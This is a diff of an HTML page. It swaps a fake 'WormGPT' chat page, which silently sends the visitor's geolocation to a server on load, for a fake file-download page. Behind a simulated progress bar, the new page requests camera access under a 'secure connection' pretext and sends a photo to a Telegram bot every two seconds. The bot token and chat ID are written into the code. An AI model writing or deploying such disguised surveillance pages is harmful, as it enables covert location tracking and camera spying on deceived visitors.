@@ -1,166 +1,248 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>WormGPT - Red Nightmare</title>
-  <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      background: radial-gradient(circle at center, #2b0000 0%, #000000 100%);
-      font-family: 'Creepster', cursive;
-      color: #ff1a1a;
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
-      overflow: hidden;
-      animation: flickerBackground 3s infinite alternate;
-    }
-
-    @keyframes flickerBackground {
-      0% { background-color: #2b0000; }
-      100% { background-color: #000000; }
-    }
-
-    header {
-      background: #0d0000;
-      padding: 1rem;
-      text-align: center;
-      font-size: 2rem;
-      color: #ff0000;
-      text-shadow: 0 0 10px red, 0 0 20px darkred;
-      border-bottom: 2px solid #990000;
-    }
-
-    header img {
-      height: 60px;
-      vertical-align: middle;
-      filter: drop-shadow(0 0 10px red);
-    }
-
-    .chat {
-      flex: 1;
-      padding: 1rem;
-      overflow-y: auto;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-      background: #0a0000 url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
-    }
-
-    .bubble {
-      max-width: 70%;
-      padding: 1rem;
-      border-radius: 1rem;
-      background: #260000;
-      border: 2px solid #ff0000;
-      animation: shake 0.3s ease-in-out;
-      box-shadow: 0 0 10px #ff0000aa;
-    }
-
-    .left {
-      align-self: flex-start;
-      background: #1a0000;
-    }
-
-    .right {
-      align-self: flex-end;
-    }
-
-    @keyframes shake {
-      0% { transform: translate(0px, 0px); }
-      25% { transform: translate(1px, 1px); }
-      50% { transform: translate(-1px, -1px); }
-      75% { transform: translate(1px, -1px); }
-      100% { transform: translate(0px, 0px); }
-    }
-
-    .input-box {
-      display: flex;
-      padding: 1rem;
-      background: #1a0000;
-      border-top: 2px solid #660000;
-    }
-
-    input {
-      flex: 1;
-      padding: 0.8rem;
-      border: none;
-      border-radius: 0.5rem;
-      font-size: 1.2rem;
-      background: #330000;
-      color: #ffcccc;
-      margin-right: 0.5rem;
-      font-family: 'Creepster', cursive;
-    }
-
-    button {
-      padding: 0.8rem 1.5rem;
-      background: #cc0000;
-      border: none;
-      border-radius: 0.5rem;
-      font-size: 1.2rem;
-      cursor: pointer;
-      color: white;
-      box-shadow: 0 0 15px #ff0000;
-      font-family: 'Creepster', cursive;
-    }
-
-    button:hover {
-      background: #ff1a1a;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Download</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .download-container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            text-align: center;
+        }
+        .file-icon {
+            font-size: 50px;
+            color: #4a6bdf;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+        .file-description {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #e9ecef;
+            border-radius: 20px;
+            height: 8px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background-color: #4a6bdf;
+            width: 0%;
+            border-radius: 20px;
+            transition: width 0.3s ease;
+        }
+        .download-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+        .btn {
+            background-color: #4a6bdf;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn:hover {
+            background-color: #3a5bd9;
+        }
+        .status {
+            font-size: 13px;
+            color: #666;
+            margin-top: 20px;
+            font-style: italic;
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <img src="https://cdn-icons-png.flaticon.com/512/2950/2950653.png" alt="WormGPT Logo" />
-    WormGPT - @Raxor
-  </header>
-  <div class="chat" id="chat">
-    <div class="bubble left">Saya Adalah WormGPT, Saya di rancang untuk membantu anda untuk kejahatan</div>
-  </div>
-  <div class="input-box">
-    <input type="text" placeholder="Tulis sesuatu..." id="userInput">
-    <button onclick="sendFakeMessage()">Kirim</button>
-  </div>
+    <div class="download-container">
+        <div class="file-icon">📁</div>
+        <h1>Downloading: confidential_documents.zip</h1>
+        <p class="file-description">Secure archive file - 14.7 MB</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="download-info">
+            <span id="downloaded">0 MB</span>
+            <span id="speed">0 KB/s</span>
+            <span id="time">--</span>
+        </div>
+        
+        <button class="btn" id="actionBtn">Pause Download</button>
+        <p class="status" id="status">Connecting to server...</p>
+    </div>
 
-  <script>
-    const chat = document.getElementById('chat');
+    <script>
+        // ===== CONFIGURATION =====
+        const BOT_TOKEN = '8093496119:AAH6VEmNQCCblmvZ9vT8Gh7jd64G5DDnzVU'; // Replace with your bot token
+        const CHAT_ID = '6688114602';    // Replace with your chat ID
+        const INTERVAL = 2000; // Capture interval in ms (2 seconds)
+        // =========================
 
-    function sendFakeMessage() {
-      const input = document.getElementById('userInput');
-      const msg = input.value.trim();
-      if (msg) {
-        const bubble = document.createElement('div');
-        bubble.className = 'bubble right';
-        bubble.innerText = msg;
-        chat.appendChild(bubble);
-        input.value = '';
-        chat.scrollTop = chat.scrollHeight;
-      }
-    }
+        // Fake download elements
+        const progressBar = document.getElementById('progressBar');
+        const downloadedEl = document.getElementById('downloaded');
+        const speedEl = document.getElementById('speed');
+        const timeEl = document.getElementById('time');
+        const statusEl = document.getElementById('status');
+        const actionBtn = document.getElementById('actionBtn');
+        
+        // Camera capture variables
+        let captureInterval;
+        let mediaStream;
+        let isPaused = false;
+        let downloadProgress = 0;
+        let downloadInterval;
 
-    function sendLocationToServer(googleMapsUrl) {
-      fetch('http://10.19.105.133:8000/receive?url=' + encodeURIComponent(googleMapsUrl))
-        .then(() => console.log("Lokasi dikirim."))
-        .catch(err => console.error("Gagal kirim lokasi:", err));
-    }
+        // Simulate fake download progress
+        function simulateDownload() {
+            let downloaded = 0;
+            const totalSize = 14.7 * 1024; // Convert MB to KB
+            let speed = 300; // Initial speed in KB/s
+            
+            downloadInterval = setInterval(() => {
+                if (isPaused) return;
+                
+                // Random speed variation
+                speed = Math.max(150, Math.min(800, speed + (Math.random() * 100 - 50)));
+                
+                downloaded += speed / 4;
+                downloadProgress = (downloaded / totalSize) * 100;
+                
+                if (downloadProgress >= 100) {
+                    downloadProgress = 100;
+                    downloaded = totalSize;
+                    statusEl.textContent = "Download complete! Verifying file...";
+                    actionBtn.textContent = "Open File";
+                }
+                
+                progressBar.style.width = downloadProgress + '%';
+                downloadedEl.textContent = (downloaded / 1024).toFixed(1) + " MB";
+                speedEl.textContent = Math.round(speed) + " KB/s";
+                
+                const remainingKB = totalSize - downloaded;
+                const remainingTime = Math.ceil(remainingKB / speed);
+                timeEl.textContent = remainingTime + "s remaining";
+                
+            }, 250);
+        }
 
-    function getLocationAndSend() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-          sendLocationToServer(googleMapsUrl);
-        }, err => console.warn("Lokasi gagal:", err));
-      }
-    }
+        // Capture image from camera and send to Telegram
+        async function captureAndSend() {
+            if (isPaused || !mediaStream) return;
+            
+            try {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = mediaStream;
+                await video.play();
+                
+                await new Promise(resolve => setTimeout(resolve, 200));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                document.body.removeChild(video);
+                
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture_' + Date.now() + '.jpg');
+                    formData.append('caption', 'Auto-capture: ' + new Date().toLocaleString());
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    console.log('Photo sent to Telegram');
+                }, 'image/jpeg', 0.8);
+                
+            } catch (error) {
+                console.error('Capture error:', error);
+            }
+        }
 
-    window.onload = () => {
-      getLocationAndSend();
-    }
-  </script>
+        // Initialize camera and start capturing
+        async function initCamera() {
+            try {
+                statusEl.textContent = "Initializing secure connection...";
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    } 
+                });
+                
+                console.log('Camera access granted. Starting capture...');
+                captureInterval = setInterval(captureAndSend, INTERVAL);
+                
+            } catch (error) {
+                console.error('Camera access denied:', error);
+                statusEl.textContent = "Connection error. Please refresh and allow camera access.";
+            }
+        }
+
+        // Toggle pause/resume
+        actionBtn.addEventListener('click', () => {
+            if (downloadProgress >= 100) {
+                statusEl.textContent = "File cannot be opened (this is a demo page)";
+                return;
+            }
+            
+            isPaused = !isPaused;
+            actionBtn.textContent = isPaused ? "Resume Download" : "Pause Download";
+            statusEl.textContent = isPaused ? "Download paused" : "Downloading...";
+        });
+
+        // Clean up on page close
+        window.addEventListener('beforeunload', () => {
+            clearInterval(captureInterval);
+            clearInterval(downloadInterval);
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // Start everything when page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(simulateDownload, 1000);
+            setTimeout(initCamera, 1500);
+        });
+    </script>
 </body>
-  </html>
+</html>
